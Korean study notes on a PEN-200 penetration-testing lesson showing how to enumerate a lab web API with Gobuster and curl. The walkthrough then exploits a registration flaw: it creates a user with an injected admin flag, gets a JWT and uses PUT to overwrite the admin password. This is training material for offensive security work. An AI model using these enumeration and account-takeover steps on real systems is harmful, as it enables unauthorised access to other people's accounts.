# 8.3.3 API 열거와 악용

> **Enumerating and Abusing APIs** · PEN-200 §8.3.3

침투 테스트 대상이 내부에서 만든 폐쇄 소스 웹 애플리케이션이고 다수의 API(Application Programming Interface)를 함께 제공하는 경우가 많음. API 는 백엔드 로직과 상호작용하며 애플리케이션 기능의 뼈대를 제공함. 그중 REST(Representational State Transfer)는 인증을 포함해 다양한 용도로 쓰임.

화이트박스라면 API 문서를 통째로 받아 공격 표면을 다 그릴 수 있지만, **블랙박스에서는 API 를 직접 찾아내야 함.** Gobuster 로 엔드포인트를 브루트포싱함.

> ⚠️ **교재 오류** — 포트가 세 곳에서 어긋남. 본문 서술은 API 게이트웨이가 `192.168.50.16` 의 **5001** 을 듣는다고 하는데, 실제 `gobuster`·`curl` 명령은 **5002** 를 치고, Gobuster 출력 배너는 다시 **5001** 을 표시함. 어느 쪽이 실제 포트인지는 원문만으로 판정 불가 `[가정]` — 아래 블록은 원문 그대로이므로 실습 시 직접 확인할 것.

API 경로는 이름 뒤에 버전 번호가 붙는 형태가 흔함.

```
/api_name/v1
```

*API 경로 명명 관례*

API 이름은 대개 그것이 다루는 기능·데이터를 그대로 드러내고 바로 뒤에 버전이 옴. 그래서 Gobuster 의 **패턴 기능**(`-p` + 패턴 파일)으로 워드리스트의 각 단어에 버전을 붙여 시도함. `{GOBUSTER}` 가 워드리스트 단어가 들어갈 자리이고, 예제는 간단히 두 버전만 씀.

```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

*API 경로 브루트포싱 결과 — `/books/v1`·`/users/v1` 이 엔드포인트로 보임*

`/ui` 로 가면 API 문서 전체가 나옴 — 화이트박스에서는 흔하나 블랙박스에서 늘 기대할 수 있는 호사는 아님. 먼저 `/users` API 를 `curl` 로 확인함.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"

```

*사용자 정보 획득 — 관리자 계정 포함 3건*

관리자 계정이 더 파 볼 값이 있음. username property 에 딸린 다른 property 가 있는지 보려고 **경로 끝에 `admin` 을 붙여** 더 작은 워드리스트로 다시 브루트포싱함.

```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w
/usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

```

*`/users/v1/admin/` 하위에서 `email`·`password` 발견*

`password` 경로가 노려볼 만하므로 `curl` 로 찔러 봄.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT
{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

*지원되지 않는 메서드 확인*

여기서 핵심은 **404 Not Found 가 아니라 405 METHOD NOT ALLOWED** 가 왔다는 것임 — 요청한 URL 은 존재하지만 쓴 HTTP 메서드가 지원되지 않는다는 뜻임. `curl` 은 기본이 GET 이므로 POST 나 PUT 같은 다른 메서드를 시도할 여지가 생김. 이 API 에서 두 메서드가 허용된다면 **사용자 자격 증명(여기서는 관리자 비밀번호) 덮어쓰기**로 이어짐.

메서드를 바꾸기 전에 덮어쓴 자격 증명이 실제로 받아들여지는지부터 확인함 — 기본 URL 을 늘려 로그인 기능이 있는지 봄.

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT
{ "status": "fail", "message": "User not found"}
```

*login API 확인*

404 지만 본문 메시지가 「사용자를 찾지 못했다」임 — **API 자체는 존재한다**는 또 다른 신호임. 남은 것은 올바른 상호작용 방법을 찾는 일임. `admin` 사용자명과 아무 비밀번호로 GET 을 POST 로 바꿔 JSON 페이로드를 보냄. `-d` 로 JSON 데이터를, `-H` 로 `Content-Type` 을 지정함.

```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type:
application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

*login API 에 POST 요청 구성*

「비밀번호가 틀렸다」는 응답은 곧 **API 파라미터 형식이 맞다**는 뜻임. 관리자 비밀번호를 모르니 경로를 바꿔 **신규 사용자 등록**이 되는지 확인함.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type:
application/json'  http://192.168.50.16:5002/users/v1/register
{ "status": "fail", "message": "'email' is a required property"}
```

*신규 사용자 등록 시도 — 이메일이 필수라는 응답*

이 김에 악용할 만한 관리자 키가 있는지 함께 시험함 — `admin` 키에 `True` 값을 얹어 보냄.

```
kali@kali:~$curl -d
'{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H
'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status":
"success"}
```

*관리자 권한으로 신규 사용자 등록 시도*

오류가 없음 = 설계상 허용돼선 안 되는 **관리자 권한 사용자 등록**이 통과한 것임. 방금 만든 자격 증명으로 앞서 찾은 login API 에 로그인함.

```
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type:
application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token":
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwi
c3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message":
"Successfully logged in.", "status": "success"}
```

*등록한 계정으로 로그인 — JWT 인증 토큰 획득*

JWT(JSON Web Token) 인증 토큰을 받음. 관리자임을 실증하려면 이 토큰으로 admin 의 비밀번호를 바꿔 보면 됨. `Authorization` 헤더에 토큰을 싣고 새 비밀번호와 함께 password API 에 POST 를 던짐.

```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic
3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```

*토큰을 실어 POST 로 보낸 결과 — 405 Method Not Allowed 로 메서드가 틀렸음이 드러남*

**값을 새로 만드는 POST 와 달리 기존 값을 교체하는 데는 PUT(과 PATCH)이 쓰이므로** `-X` 로 메서드를 명시해 다시 보냄.

```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic
3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

*PUT 으로 관리자 비밀번호 변경 시도 — 오류 메시지 없음*

오류가 없다는 것은 백엔드 로직이 예외를 던지지 않았다고 볼 근거임. 바꾼 비밀번호로 admin 로그인을 시도해 성공을 확인함.

```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type:
application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token":
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwi
c3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message":
"Successfully logged in.", "status": "success"}
```

*변경한 비밀번호로 admin 로그인 성공*

등록 API 에 있던 **논리적 권한 상승 버그**로 관리자 계정을 탈취한 것임. 커스텀 API 를 쓰는 웹 애플리케이션에서는 테스트 부족과 보안 코딩 관행 미준수로 이런 실수가 정도만 달리해 반복됨.

여기까지는 전체 트래픽 흐름을 감 잡으려 `curl` 로 수동 진단했으나, **API 수가 많아지면 이 방식은 확장되지 않음.** 같은 절차를 Burp 안에서 재현할 수 있음 — 명령 끝에 `--proxy 127.0.0.1:8080` 을 붙여 요청을 프록시로 흘려보낸 뒤, Repeater 탭에서 빈 요청을 새로 만들어 같은 데이터를 채우고 Send 로 응답을 확인함.
